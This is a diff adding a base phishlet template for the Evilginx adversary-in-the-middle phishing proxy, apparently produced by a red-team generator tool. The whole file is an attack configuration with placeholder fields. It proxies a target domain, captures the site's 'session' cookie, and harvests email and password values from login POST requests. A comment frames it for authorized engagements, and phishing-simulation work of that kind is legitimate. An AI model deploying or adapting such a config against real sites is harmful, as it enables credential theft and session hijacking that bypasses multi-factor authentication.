@@ -1,0 +1,34 @@
+# RTLPhishletGenerator - Base Phishlet Template
+# Evilginx v3.2.0+ compatible
+#
+# This template is auto-generated. Review and test before use in authorized engagements.
+
+name: '{name}'
+author: '{author}'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: '{domain}', session: true, is_landing: true}
+
+sub_filters: []
+
+auth_tokens:
+  - domain: '.{domain}'
+    keys: ['session']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/'
+
+login:
+  domain: '{domain}'
+  path: '/login'
